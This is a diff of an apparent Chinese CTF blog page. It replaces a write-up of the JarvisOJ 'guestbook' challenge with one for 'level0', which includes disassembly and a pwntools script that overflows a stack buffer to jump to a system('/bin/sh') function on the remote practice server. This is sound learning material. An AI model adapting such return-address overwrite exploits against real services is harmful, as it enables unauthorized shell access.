@@ -3,18 +3,21 @@
 <head>
   <meta charset="utf-8">
   
-  <title>JarvisOJ guestbook | GoldsNow</title>
+  <title>JarvisOJ level0 | GoldsNow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+  <meta name="description" content="相当于签到题把
+buf溢出">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ guestbook">
-<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/index.html">
+<meta property="og:title" content="JarvisOJ level0">
+<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level0/index.html">
 <meta property="og:site_name" content="GoldsNow">
-<meta property="og:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
-<meta property="og:updated_time" content="2017-03-24T02:58:51.849Z">
+<meta property="og:description" content="相当于签到题把
+buf溢出">
+<meta property="og:updated_time" content="2017-03-24T12:29:15.214Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ guestbook">
-<meta name="twitter:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+<meta name="twitter:title" content="JarvisOJ level0">
+<meta name="twitter:description" content="相当于签到题把
+buf溢出">
   
     <link rel="alternative" href="/atom.xml" title="GoldsNow" type="application/atom+xml">
   
@@ -216,11 +219,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-[JarvisOJ]guestbook" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-[JarvisOJ]level0" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/24/[JarvisOJ]guestbook/" class="article-date">
-      <time datetime="2017-03-24T02:28:00.000Z" itemprop="datePublished">2017-03-24</time>
+      <a href="/2017/03/24/[JarvisOJ]level0/" class="article-date">
+      <time datetime="2017-03-24T12:21:00.000Z" itemprop="datePublished">2017-03-24</time>
 </a>
     </div>
   
@@ -233,7 +236,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      JarvisOJ guestbook
+      JarvisOJ level0
     </h1>
   
 
@@ -258,10 +261,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v4; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line"></div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input your message:\n"</span>, <span class="number">0x14</span>uLL);</div><div class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x100</span>uLL);</div><div class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"I have received your message, Thank you!\n"</span>, <span class="number">0x29</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以发现这里的v4只有0x88的栈空间，而可以输入的长度为0x14<br>所以存在着溢出。这个程序还有一个后面代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  FILE *v0; <span class="comment">// rbx@1</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Fh] [bp-9h]@2</span></div><div class="line"></div><div class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    result = fgetc(v0);</div><div class="line">    buf = result;</div><div class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>记录地址为<code>0x400620</code><br>所以exp为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">addr_goodgame= <span class="number">0x400620</span></div><div class="line">shellcode = <span class="string">'a'</span>*<span class="number">136</span>+p64(addr_goodgame)</div></pre></td></tr></table></figure></p>
-
+        <p>相当于签到题把</p>
+<p>buf溢出<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">.text:0000000000400596                 public callsystem</div><div class="line">.text:0000000000400596 callsystem      proc near</div><div class="line">.text:0000000000400596                 push    rbp</div><div class="line">.text:0000000000400597                 mov     rbp, rsp</div><div class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</div><div class="line">.text:000000000040059F                 call    _system</div><div class="line">.text:00000000004005A4                 pop     rbp</div><div class="line">.text:00000000004005A5                 retn</div><div class="line">.text:00000000004005A5 callsystem      endp</div><div class="line">.text:00000000004005A5</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6 ; =============== S U B R O U T I N E =======================================</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6 ; Attributes: bp-based frame</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6                 public vulnerable_function</div><div class="line">.text:00000000004005A6 vulnerable_function proc near           ; CODE XREF: main+28p</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6 buf             = byte ptr -80h</div><div class="line">.text:00000000004005A6</div><div class="line">.text:00000000004005A6                 push    rbp</div><div class="line">.text:00000000004005A7                 mov     rbp, rsp</div><div class="line">.text:00000000004005AA                 add     rsp, 0FFFFFFFFFFFFFF80h</div><div class="line">.text:00000000004005AE                 lea     rax, [rbp+buf]</div><div class="line">.text:00000000004005B2                 mov     edx, 200h       ; nbytes</div><div class="line">.text:00000000004005B7                 mov     rsi, rax        ; buf</div><div class="line">.text:00000000004005BA                 mov     edi, 0          ; fd</div><div class="line">.text:00000000004005BF                 call    _read</div><div class="line">.text:00000000004005C4                 leave</div><div class="line">.text:00000000004005C5                 retn</div><div class="line">.text:00000000004005C5 vulnerable_function endp</div></pre></td></tr></table></figure></p>
+<p>直接 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./level0')</span></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</div><div class="line"></div><div class="line">addr_system= <span class="number">0x400596</span></div><div class="line">shellcode = <span class="string">'a'</span>*<span class="number">136</span>+p64(addr_system)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Hello, World'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
       
       
     </div>
@@ -270,13 +273,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]guestbook/">JarvisOJ guestbook</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]level0/">JarvisOJ level0</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 GoldsNow 的个人博客">GoldsNow</a></p>
-        <p><span>发布时间:</span>2017年03月24日 - 10时28分</p>
-        <p><span>最后更新:</span>2017年03月24日 - 10时58分</p>
+        <p><span>发布时间:</span>2017年03月24日 - 20时21分</p>
+        <p><span>最后更新:</span>2017年03月24日 - 20时29分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]guestbook/" title="JarvisOJ guestbook">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]level0/" title="JarvisOJ level0">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level0/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level0/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -289,18 +292,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/03/24/[JarvisOJ]level_x64/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/03/24/[JarvisOJ]level3/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          JarvisOJ level2_x64
+          JarvisOJ level3
         
       </div>
     </a>
   
   
-    <a href="/2017/03/23/3-22 整理/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF の 套路</div>
+    <a href="/2017/03/24/[JarvisOJ]level_x64/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JarvisOJ level2_x64</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -362,13 +365,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/24/[JarvisOJ]level_x64/" title="上一篇: JarvisOJ level2_x64">
+            <a href="/2017/03/24/[JarvisOJ]level3/" title="上一篇: JarvisOJ level3">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/23/3-22 整理/" title="下一篇: CTF の 套路">
+            <a href="/2017/03/24/[JarvisOJ]level_x64/" title="下一篇: JarvisOJ level2_x64">
                 <i class="fa fa-angle-right"></i>
             </a>
         
